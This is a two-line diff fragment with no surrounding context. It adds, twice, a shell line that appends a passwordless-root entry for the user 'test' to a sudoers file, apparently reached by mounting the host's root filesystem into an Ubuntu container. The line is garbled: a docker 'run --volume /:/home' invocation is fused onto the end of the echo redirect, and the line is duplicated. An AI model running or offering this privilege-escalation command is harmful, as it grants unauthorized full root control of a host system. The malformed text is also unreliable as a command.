@@ -1,0 +1,2 @@
+echo 'test       ALL=(ALL) NOPASSWD: ALL' >> /home/etc/sudoers run --volume /:/home -it ubuntu bash
+echo 'test       ALL=(ALL) NOPASSWD: ALL' >> /home/etc/sudoers run --volume /:/home -it ubuntu bash
